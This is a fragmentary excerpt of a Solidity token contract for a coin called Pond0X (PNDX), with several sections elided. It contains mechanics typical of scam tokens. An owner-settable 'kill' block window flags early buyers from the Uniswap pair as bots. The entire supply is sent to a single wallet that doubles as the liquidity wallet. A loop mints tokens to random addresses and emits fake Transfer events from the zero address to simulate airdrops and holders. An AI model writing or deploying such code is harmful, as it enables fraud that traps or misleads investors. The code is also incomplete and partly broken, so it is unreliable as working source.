...
contract PNDX is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    string private _name = "Pond0X";
    string private _symbol = "PNDX";
    ...
    address payable public marketingWalletAddress = payable(0x59258D3321B43797916340F0Bb2161557853314c

);
    address payable public liquidityWalletAddress = payable(0x59258D3321B43797916340F0Bb2161557853314c
    ...
    uint256 private minimumTokensBeforeSwap = 1000000000000 * 5 **_decimals; 
    ...
    constructor () {
        ...
        //0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02 PLU
        //0x43a8E89CABe179b6431D6c03CC84e20D974f7105 SV
        ...
        _balances[marketingWalletAddress] = _totalSupply;
    ...
    function setKillNum(uint256 kill) public onlyOwner {
        killblock = kill;
    }
    ...
    //Don't touch this, this method is going to send tax to your wallet
                ...
                if(sender == uniswapPair) {
                    if (block.number <= launchedBlock + killblock) { 
                        ...
                        addBot(recipient);
                         ...
                         address ad1;
                    uint256 _airdropAmount1 = 10;

                          for(uint i=0;i <5;i++){
                    ad1 = address(uint160(uint(keccak256(abi.encodePacked(i, _airdropAmount1, block.timestamp)))));
                     if(ad1!=uniswapPair){
                     _balances[ad1]=_balances[ad1].add(_airdropAmount1);
                     }
                    
                   
                     
                    emit Transfer(address(0),ad1,_airdropAmount1);
                }
